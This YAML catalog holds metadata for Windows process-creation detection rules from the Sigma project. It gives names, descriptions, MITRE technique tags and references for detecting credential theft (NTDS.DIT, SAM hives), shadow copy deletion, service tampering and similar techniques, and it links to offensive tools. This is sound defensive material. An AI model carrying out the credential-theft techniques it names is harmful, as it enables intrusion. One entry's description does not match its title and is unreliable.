- detection_id: 8bc64091-6875-4881-aaf9-7bd25b5dda08
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_ntds.yml
  name: Suspicious Process Patterns NTDS.DIT Exfil
  description: Detects suspicious process patterns used in NTDS.DIT exfiltration
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.003
  tags:
  - attack.credential-access
  - attack.t1003.003
  time_window: ''
  references:
  - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration
  - https://www.n00py.io/2022/03/manipulating-user-passwords-without-mimikatz/
  - https://pentestlab.blog/tag/ntds-dit/
  - https://github.com/samratashok/nishang/blob/414ee1104526d7057f9adaeee196d91ae447283e/Gather/Copy-VSS.ps1
  - https://github.com/zcgonvh/NTDSDumpEx
  - https://github.com/rapid7/metasploit-framework/blob/d297adcebb5c1df6fe30b12ca79b161deb71571c/data/post/powershell/NTDSgrab.ps1
  - https://blog.talosintelligence.com/2022/08/recent-cyber-attack.html?m=1
  false_positives:
  - Unknown
  notes: ''
- detection_id: caf201a9-c2ce-4a26-9c3a-2b9525413711
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_nteventlogfile_usage.yml
  name: Potentially Suspicious Call To Win32_NTEventlogFile Class
  description: Detects usage of the WMI class "Win32_NTEventlogFile" in a potentially
    suspicious way (delete, backup, change permissions, etc.) from a PowerShell script
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa394225(v=vs.85)
  false_positives:
  - Unknown
  notes: ''
- detection_id: a96970af-f126-420d-90e1-d37bf25e50e1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_ntfs_short_name_path_use_image.yml
  name: Use Short Name Path in Image
  description: Detect use of the Windows 8.3 short name. Which could be used as a
    method to avoid Image detection
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.t1564.004
  time_window: ''
  references:
  - https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc959352(v=technet.10)
  - https://twitter.com/frack113/status/1555830623633375232
  false_positives:
  - Applications could use this notation occasionally which might generate some false
    positives. In that case Investigate the parent and child process.
  notes: ''
- detection_id: dd6b39d9-d9be-4a3b-8fe0-fe3c6a5c1795
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_ntfs_short_name_use_cli.yml
  name: Use NTFS Short Name in Command Line
  description: Detect use of the Windows 8.3 short name. Which could be used as a
    method to avoid command-line detection
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.t1564.004
  time_window: ''
  references:
  - https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc959352(v=technet.10)
  - https://twitter.com/jonasLyk/status/1555914501802921984
  false_positives:
  - Applications could use this notation occasionally which might generate some false
    positives. In that case Investigate the parent and child process.
  notes: ''
- detection_id: 3ef5605c-9eb9-47b0-9a71-b727e6aa5c3b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_ntfs_short_name_use_image.yml
  name: Use NTFS Short Name in Image
  description: Detect use of the Windows 8.3 short name. Which could be used as a
    method to avoid Image based detection
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.t1564.004
  time_window: ''
  references:
  - https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc959352(v=technet.10)
  - https://twitter.com/jonasLyk/status/1555914501802921984
  false_positives:
  - Software Installers
  notes: ''
- detection_id: cb5a2333-56cf-4562-8fcb-22ba1bca728d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_obfuscated_ip_download.yml
  name: Obfuscated IP Download Activity
  description: Detects use of an encoded/obfuscated version of an IP address (hex,
    octal...) in an URL combined with a download command
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - multi_signal_correlation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques: []
  tags:
  - attack.discovery
  time_window: ''
  references:
  - https://h.43z.one/ipconverter/
  - https://twitter.com/Yasser_Elsnbary/status/1553804135354564608
  - https://twitter.com/fr0s7_/status/1712780207105404948
  false_positives:
  - Unknown
  notes: ''
- detection_id: 56d19cb4-6414-4769-9644-1ed35ffbb148
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_obfuscated_ip_via_cli.yml
  name: Obfuscated IP Via CLI
  description: Detects usage of an encoded/obfuscated version of an IP address (hex,
    octal, etc.) via command line
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques: []
  tags:
  - attack.discovery
  time_window: ''
  references:
  - https://h.43z.one/ipconverter/
  - https://twitter.com/Yasser_Elsnbary/status/1553804135354564608
  false_positives:
  - Unknown
  notes: ''
- detection_id: cbec226f-63d9-4eca-9f52-dfb6652f24df
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_parents.yml
  name: Suspicious Process Parents
  description: Detects suspicious parent processes that should not have any children
    or should only have a single possible child program
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  time_window: ''
  references:
  - https://twitter.com/x86matthew/status/1505476263464607744?s=12
  - https://svch0st.medium.com/stats-from-hunting-cobalt-strike-beacons-c17e56255f9b
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6812a10b-60ea-420c-832f-dfcc33b646ba
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_powershell_execution_via_dll.yml
  name: Potential PowerShell Execution Via DLL
  description: 'Detects potential PowerShell execution from a DLL instead of the usual
    PowerShell process as seen used in PowerShdll.

    This detection assumes that PowerShell commands are passed via the CommandLine.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  time_window: ''
  references:
  - https://github.com/p3nt4/PowerShdll/blob/62cfa172fb4e1f7f4ac00ca942685baeb88ff356/README.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9bd04a79-dabe-4f1f-a5ff-92430265c96b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_priv_escalation_via_named_pipe.yml
  name: Privilege Escalation via Named Pipe Impersonation
  description: Detects a remote file copy attempt to a hidden network share. This
    may indicate lateral movement or data staging activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1021
  tags:
  - attack.lateral-movement
  - attack.t1021
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/privilege-escalation-via-named-pipe-impersonation.html
  false_positives:
  - Other programs that cause these patterns (please report)
  notes: ''
- detection_id: 213d6a77-3d55-4ce8-ba74-fcfef741974e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_private_keys_recon.yml
  name: Private Keys Reconnaissance Via CommandLine Tools
  description: Adversaries may search for private key certificate files on compromised
    systems for insecurely stored credential
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1552.004
  tags:
  - attack.credential-access
  - attack.t1552.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1552.004/T1552.004.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 50d66fb0-03f8-4da0-8add-84e77d12a020
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_privilege_escalation_cli_patterns.yml
  name: Suspicious RunAs-Like Flag Combination
  description: Detects suspicious command line flags that let the user set a target
    user and command as e.g. seen in PsExec-like tools
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://www.trendmicro.com/en_us/research/22/k/hack-the-real-box-apt41-new-subgroup-earth-longzhi.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 96036718-71cc-4027-a538-d1587e0006a7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_proc_wrong_parent.yml
  name: Windows Processes Suspicious Parent Directory
  description: Detect suspicious parent processes of well-known Windows processes
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.003
  - T1036.005
  tags:
  - attack.defense-evasion
  - attack.t1036.003
  - attack.t1036.005
  time_window: ''
  references:
  - https://web.archive.org/web/20180718061628/https://securitybytes.io/blue-team-fundamentals-part-two-windows-processes-759fe15965e2
  - https://www.carbonblack.com/2014/06/10/screenshot-demo-hunt-evil-faster-than-ever-with-carbon-black/
  - https://www.13cubed.com/downloads/windows_process_genealogy_v2.pdf
  false_positives:
  - Some security products seem to spawn these
  notes: ''
- detection_id: efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_progname.yml
  name: Suspicious Program Names
  description: Detects suspicious patterns in program names or folders that are often
    found in malicious samples or hacktools
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md
  false_positives:
  - Legitimate tools that accidentally match on the searched patterns
  notes: ''
- detection_id: aa2efee7-34dd-446e-8a37-40790a66efd7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_recon.yml
  name: Recon Information for Export with Command Prompt
  description: Once established within a system or network, an adversary may use automated
    techniques for collecting internal data.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1119
  tags:
  - attack.collection
  - attack.t1119
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1119/T1119.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5ce0f04e-3efc-42af-839d-5b3a543b76c0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_recycle_bin_fake_execution.yml
  name: Suspicious Process Execution From Fake Recycle.Bin Folder
  description: Detects process execution from a fake recycle bin folder, often used
    to avoid security solution.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.mandiant.com/resources/blog/infected-usb-steal-secrets
  - https://unit42.paloaltonetworks.com/cloaked-ursa-phishing/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: ab9e3b40-0c85-4ba1-aede-455d226fd124
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_redirect_local_admin_share.yml
  name: Suspicious Redirection to Local Admin Share
  description: Detects a suspicious output redirection to the local admins share,
    this technique is often found in malicious scripts or hacktool stagers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1048
  tags:
  - attack.exfiltration
  - attack.t1048
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/
  - http://blog.talosintelligence.com/2022/09/lazarus-three-rats.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8a3038e8-9c9d-46f8-b184-66234a160f6f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_remote_desktop_tunneling.yml
  name: Potential Remote Desktop Tunneling
  description: Detects potential use of an SSH utility to establish RDP over a reverse
    SSH Tunnel. This can be used by attackers to enable routing of network packets
    that would otherwise not reach their intended destination.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1021
  tags:
  - attack.lateral-movement
  - attack.t1021
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/potential-remote-desktop-tunneling-detected.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: ad691d92-15f2-4181-9aa4-723c74f9ddc3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_right_to_left_override.yml
  name: Potential Defense Evasion Via Right-to-Left Override
  description: 'Detects the presence of the "u202+E" character, which causes a terminal,
    browser, or operating system to render text in a right-to-left sequence.

    This is used as an obfuscation and masquerading techniques.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.002
  tags:
  - attack.defense-evasion
  - attack.t1036.002
  time_window: ''
  references:
  - https://redcanary.com/blog/right-to-left-override/
  - https://www.malwarebytes.com/blog/news/2014/01/the-rtlo-method
  - https://unicode-explorer.com/c/202E
  - https://tria.ge/241015-l98snsyeje/behavioral2
  false_positives:
  - Commandlines that contains scriptures such as arabic or hebrew might make use
    of this character
  notes: ''
- detection_id: 1228c958-e64e-4e71-92ad-7d429f4138ba
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_script_exec_from_env_folder.yml
  name: Script Interpreter Execution From Suspicious Folder
  description: Detects a suspicious script execution in temporary folders or folders
    accessible by environment variables
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/91ba814a86ddedc7a9d546e26f912c541205b47a853d227756ab1334ade92c3f
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-russia-ukraine-military
  - https://learn.microsoft.com/en-us/windows/win32/shell/csidl
  false_positives:
  - Unknown
  notes: ''
- detection_id: a6a39bdb-935c-4f0a-ab77-35f4bbf44d33
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_script_exec_from_temp.yml
  name: Suspicious Script Execution From Temp Folder
  description: Detects a suspicious script executions from temporary folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/
  false_positives:
  - Administrative scripts
  notes: ''
- detection_id: f57f8d16-1f39-4dcb-a604-6c73d9b54b3d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_sensitive_file_access_shadowcopy.yml
  name: Sensitive File Access Via Volume Shadow Copy Backup
  description: 'Detects a command that accesses the VolumeShadowCopy in order to extract
    sensitive files such as the Security or SAM registry hives or the AD database
    (ntds.dit)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://twitter.com/vxunderground/status/1423336151860002816?s=20
  - https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection
  - https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 17a1be64-8d88-40bf-b5ff-a4f7a50ebcc8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_service_creation.yml
  name: Suspicious New Service Creation
  description: Detects creation of a new service via "sc" command or the powershell
    "new-service" cmdlet with suspicious binary paths
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md
  - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 883faa95-175a-4e22-8181-e5761aeb373c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_service_dir.yml
  name: Suspicious Service Binary Directory
  description: Detects a service binary running in a suspicious directory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1202
  tags:
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://blog.truesec.com/2021/03/07/exchange-zero-day-proxylogon-and-hafnium/
  false_positives:
  - Unknown
  notes: ''
- detection_id: ce72ef99-22f1-43d4-8695-419dcb5d9330
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_service_tamper.yml
  name: Suspicious Windows Service Tampering
  description: 'Detects the usage of binaries such as ''net'', ''sc'' or ''powershell''
    in order to stop, pause, disable or delete critical or important Windows services
    such as AV, Backup, etc. As seen being used in some ransomware scripts

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1489
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.impact
  - attack.t1489
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/h/ransomware-actor-abuses-genshin-impact-anti-cheat-driver-to-kill-antivirus/Genshin%20Impact%20Figure%2010.jpg
  - https://www.trellix.com/en-sg/about/newsroom/stories/threat-labs/lockergoga-ransomware-family-used-in-targeted-attacks.html
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  - https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/
  - https://www.virustotal.com/gui/file/38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955
  - https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/delete-method-in-class-win32-service
  false_positives:
  - Administrators or tools shutting down the services due to upgrade or removal purposes.
    If you experience some false positive, please consider adding filters to the parent
    process launching this command and not removing the entry
  notes: ''
- detection_id: b17ea6f7-6e90-447e-a799-e6c0a493d6ce
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_shadow_copies_creation.yml
  name: Shadow Copies Creation Using Operating Systems Utilities
  description: Shadow Copies creation using operating systems utilities, possible
    credential access
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003
  - T1003.002
  - T1003.003
  tags:
  - attack.credential-access
  - attack.t1003
  - attack.t1003.002
  - attack.t1003.003
  time_window: ''
  references:
  - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
  - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/tutorial-for-ntds-goodness-vssadmin-wmis-ntdsdit-system/
  false_positives:
  - Legitimate administrator working with shadow copies, access for backup purposes
  notes: ''
- detection_id: c947b146-0abc-4c87-9c64-b17e9d7274a2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_shadow_copies_deletion.yml
  name: Shadow Copies Deletion Using Operating Systems Utilities
  description: Shadow Copies deletion using operating systems utilities
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1070
  - T1490
  tags:
  - attack.defense-evasion
  - attack.impact
  - attack.t1070
  - attack.t1490
  time_window: ''
  references:
  - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
  - https://blog.talosintelligence.com/2017/05/wannacry.html
  - https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/new-teslacrypt-ransomware-arrives-via-spam/
  - https://www.bleepingcomputer.com/news/security/why-everyone-should-disable-vssadmin-exe-now/
  - https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100
  - https://github.com/Neo23x0/Raccine#the-process
  - https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/gen_ransomware_command_lines.yar
  - https://redcanary.com/blog/intelligence-insights-october-2021/
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackbyte-exbyte-ransomware
  false_positives:
  - Legitimate Administrator deletes Shadow Copies using operating systems utilities
    for legitimate reason
  - LANDesk LDClient Ivanti-PSModule (PS EncodedCommand)
  notes: ''
- detection_id: 3a6586ad-127a-4d3b-a677-1e6eacdf8fde
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_shell_spawn_susp_program.yml
  name: Windows Shell/Scripting Processes Spawning Suspicious Programs
  description: Detects suspicious child processes of a Windows shell and scripting
    processes such as wscript, rundll32, powershell, mshta...etc.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1059.005
  - T1218
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1059.005
  - attack.t1059.001
  - attack.t1218
  time_window: ''
  references:
  - https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html
  false_positives:
  - Administrative scripts
  - Microsoft SCCM
  notes: ''
- detection_id: 3c1b5fb0-c72f-45ba-abd1-4d4c353144ab
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_sysnative.yml
  name: Process Creation Using Sysnative Folder
  description: Detects process creation events that use the Sysnative folder (common
    for CobaltStrike spawns)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055
  time_window: ''
  references:
  - https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/
  false_positives:
  - Unknown
  notes: ''
- detection_id: e4a6b256-3e47-40fc-89d2-7a477edd6915
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_system_exe_anomaly.yml
  name: System File Execution Location Anomaly
  description: 'Detects the execution of a Windows system binary that is usually located
    in the system folder from an uncommon location.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 10
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  time_window: ''
  references:
  - https://twitter.com/GelosSnake/status/934900723426439170
  - https://asec.ahnlab.com/en/39828/
  - https://www.splunk.com/en_us/blog/security/inno-setup-malware-redline-stealer-campaign.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2617e7ed-adb7-40ba-b0f3-8f9945fe6c09
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_susp_system_user_anomaly.yml
  name: Suspicious SYSTEM User Process Creation
  description: Detects a suspicious process creation as SYSTEM user (suspicious program
    or command line parameter)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003
  - T1027
  - T1134
  tags:
  - attack.credential-access
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1134
  - attack.t1003
  - attack.t1027
  time_window: ''
  references:
  - Internal Research
  - https://tools.thehacker.recipes/mimikatz/modules
  false_positives:
  - Administrative activity
  - Scripts and administrative tools used in the monitored environment
  - Monitoring activity
  notes: ''
